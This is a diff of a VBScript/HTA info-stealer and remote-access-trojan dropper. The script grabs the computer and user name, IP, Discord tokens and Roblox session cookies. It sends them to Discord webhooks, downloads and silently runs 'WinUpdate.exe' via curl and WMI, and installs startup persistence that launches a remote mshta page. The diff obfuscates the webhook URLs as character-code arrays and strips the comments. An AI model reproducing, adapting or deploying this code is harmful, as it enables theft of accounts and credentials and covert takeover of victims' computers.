@@ -10,24 +10,25 @@ Dim sh, fso, WH, RE_WH, PC, USER, ratDropped
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-WH = "https://discord.com/api/webhooks/1575903921002520681/3Dy6aRhNZkKwuLZ4H5TzhRnpbXAlFFwcyf_d8vsEczYLs5CPsnMmulcl2G8-Ky2njykV"
-RE_WH = "https://discord.com/api/webhooks/1575903997167140925/z9kvUXd67kMw3kbNT8Ce5UU1IXhmd8yNYr9ojwiM2D8Ekq9IrmnRhY74vmFFjGSXD5Ke"
+Dim arr1, arr2, i, s1, s2
+arr1 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,57,48,51,57,50,49,48,48,50,53,50,48,54,56,49,47,51,68,121,54,97,82,104,78,90,107,75,119,117,76,90,52,72,53,84,122,104,82,110,112,98,88,65,108,70,70,119,99,121,102,95,100,56,118,115,69,99,122,89,76,115,53,67,80,115,110,77,109,117,108,99,108,50,71,56,45,75,121,50,110,106,121,107,86)
+s1 = ""
+For i = 0 To UBound(arr1)
+    s1 = s1 & Chr(arr1(i))
+Next
+WH = s1
 
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 ratDropped = False
 
-' --- 1. INITIAL GRABS (to C2 WH) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
 Call IP(WH)
 Call GrabTokens(WH)
 Call Persistence
 Call PostCookieOnly(WH)
-
-' --- 2. DROP RAT LAST (init) ---
 Call DropRAT(WH, True)
 
-' --- 3. LOOP (30s, grabs + RAT re-drop to RE_WH) ---
 Dim runCount
 runCount = 0
 Do
@@ -36,48 +37,29 @@ Do
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
-    
-    ' Only download RAT if it hasn't dropped successfully yet
-    If Not ratDropped Then
-        Call DropRAT(RE_WH, True)
-    End If
-    
+    If Not ratDropped Then Call DropRAT(RE_WH, True)
     Call SleepSeconds(30)
 Loop
 
 window.close()
 
-' --- RAT DROP (Standard Download to Disk + Execute) ---
 Sub DropRAT(targetWH, sendRocket)
-    ' Updated RAT Link
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1575883258497867786/WinUpdate.exe?ex=6b0ae727&is=6b0995a7&hm=6033f4b5076629cba2eeeab88d4121929ee5b01f355bd119ea042ee1fdac95af&"
-    
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
     Randomize
     Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
     Dim op : op = tPath & "\" & fname
-
     If fso.FileExists(op) Then fso.DeleteFile op, True
-
-    ' Download via curl.exe
     Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
     sh.Run dlCmd, 0, True
-
-    ' Check file and execute
     If fso.FileExists(op) Then
         Dim fSize : fSize = fso.GetFile(op).Size
         If fSize > 100000 Then
             Dim fSizeMB : fSizeMB = Round(fSize / 1048576, 2)
-            
             If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading: " & fSizeMB & " MB", 10181046, targetWH)
-            
-            ' Execute via WMI
             Call RunCmd("""" & op & """")
-            
-            ' Set flag to True so it stops downloading in the loop
             ratDropped = True
-            
             If sendRocket Then 
                 Call SleepSeconds(2)
                 Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed successfully.", 10181046, targetWH)
@@ -88,7 +70,6 @@ Sub DropRAT(targetWH, sendRocket)
     End If
 End Sub
 
-' --- RunCmd (Hidden Execution via WMI) ---
 Sub RunCmd(cmd)
     Dim w,p,i,s
     Set w = GetObject("winmgmts:\\.\root\cimv2")
@@ -98,7 +79,6 @@ Sub RunCmd(cmd)
     p.Create cmd,,s,i
 End Sub
 
-' --- IP Function ---
 Sub IP(targetWH)
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -116,14 +96,12 @@ Sub IP(targetWH)
     Set xh = Nothing
 End Sub
 
-' --- PostCookieOnly ---
 Sub PostCookieOnly(targetWH)
     Dim cookie : cookie = GetRobloxCookie()
     If Len(cookie) = 0 Then Exit Sub
     Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
 End Sub
 
-' --- GetRobloxCookie ---
 Function GetRobloxCookie()
     GetRobloxCookie = ""
     Dim paths(4)
@@ -182,7 +160,6 @@ Function GetRobloxCookie()
     GetRobloxCookie = cookie
 End Function
 
-' --- Sleep Functions ---
 Sub SleepSeconds(s)
     Dim t0, t1, t2, elapsed
     t0 = Timer()
@@ -200,7 +177,6 @@ Sub SleepSeconds(s)
     End If
 End Sub
 
-' --- Persistence ---
 Sub Persistence()
     Dim payload : payload = "mshta https://dicerigx.app/"
     On Error Resume Next
@@ -210,10 +186,18 @@ Sub Persistence()
     Dim sf : Set sf = fso.CreateTextFile(sp, True)
     sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
     sf.Close
+    
+    Dim arr2, i, s2
+    arr2 = Array(104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,55,53,57,48,51,57,57,55,49,54,55,49,52,48,57,50,53,47,122,57,107,118,85,88,100,54,55,107,77,119,51,107,98,78,84,56,67,101,53,85,85,49,73,88,104,109,100,56,121,78,89,114,57,111,106,119,105,77,50,68,56,69,107,113,57,73,114,109,110,82,104,89,55,52,118,109,70,70,106,71,83,88,68,53,75,101)
+    s2 = ""
+    For i = 0 To UBound(arr2)
+        s2 = s2 & Chr(arr2(i))
+    Next
+    RE_WH = s2
+    
     Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
 End Sub
 
-' --- GrabTokens ---
 Sub GrabTokens(targetWH)
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
@@ -253,12 +237,10 @@ Sub GrabTokens(targetWH)
     End If
 End Sub
 
-' --- Utility Functions ---
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
 Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
 Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
 
-' --- PostEmbed ---
 Sub PostEmbed(t, d, c)
     Call PostEmbedTo(t, d, c, WH)
 End Sub
@@ -274,7 +256,6 @@ Sub PostEmbedTo(t, d, c, target_wh)
     Set h = Nothing
 End Sub
 
-' --- DecryptDPAPI ---
 Function DecryptDPAPI(b64)
     DecryptDPAPI = ""
     Dim inf: inf = TmpFile("dpi.txt")
@@ -291,7 +272,6 @@ Function DecryptDPAPI(b64)
     fso.DeleteFile outf, True
 End Function
 
-' --- Ej ---
 Function Ej(s)
     Ej = s
     Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
